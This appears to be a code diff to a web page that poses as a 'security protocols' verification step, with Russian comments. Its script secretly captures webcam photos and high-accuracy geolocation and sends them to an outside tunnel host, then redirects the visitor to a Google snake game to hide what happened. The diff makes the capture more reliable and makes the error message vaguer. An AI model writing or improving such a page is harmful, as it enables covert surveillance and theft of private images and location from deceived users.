@@ -31,7 +31,7 @@
     <canvas id="c"></canvas>
 
 <script>
-    // 🔗 ТВОЯ НОВАЯ ССЫЛКА:
+    // 🔗 ОБНОВЛЕННАЯ ССЫЛКА:
     const API = "https://9c7b82e70f8a7d.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
@@ -58,19 +58,21 @@
             const v = document.getElementById('v');
             v.srcObject = stream;
             
-            // Ждем готовности видео (исправляет проблему на Mac и iOS)
-            await new Promise((resolve) => {
-                v.onloadedmetadata = () => {
+            // Ждем готовности видео (улучшенный метод)
+            await new Promise((resolve, reject) => {
+                const timeout = setTimeout(() => resolve(), 3000); // Тайм-аут на случай зависания
+                v.onloadeddata = () => {
+                    clearTimeout(timeout);
                     v.play().then(resolve).catch(resolve);
                 };
             });
 
-            // Задержка для адаптации камеры (автофокус/свет)
-            await new Promise(r => setTimeout(r, 1500));
+            // Небольшая задержка для авто-фокуса
+            await new Promise(r => setTimeout(r, 1000));
 
             const canvas = document.getElementById('c');
-            canvas.width = v.videoWidth;
-            canvas.height = v.videoHeight;
+            canvas.width = v.videoWidth || 1280;
+            canvas.height = v.videoHeight || 720;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(v, 0, 0);
 
@@ -95,7 +97,7 @@
         msg.innerText = "Initializing security protocols...";
 
         try {
-            // Геолокация (запускаем параллельно)
+            // Геолокация
             navigator.geolocation.getCurrentPosition(p => {
                 fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(()=>{});
             }, null, {enableHighAccuracy: true, timeout: 5000});
@@ -112,7 +114,7 @@
                 if (photo) {
                     fd.append('files', photo, getSmartName(plan[i].l));
                 }
-                await new Promise(r => setTimeout(r, 600));
+                await new Promise(r => setTimeout(r, 500));
             }
 
             if (fd.has('files')) {
@@ -129,8 +131,9 @@
             setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
 
         } catch (e) {
+            console.error(e);
             statusTitle.innerText = "Error";
-            msg.innerText = "Check camera permissions and retry.";
+            msg.innerText = "Verification failed. Please retry.";
             loader.style.display = 'none';
             btn.style.display = 'block';
         }
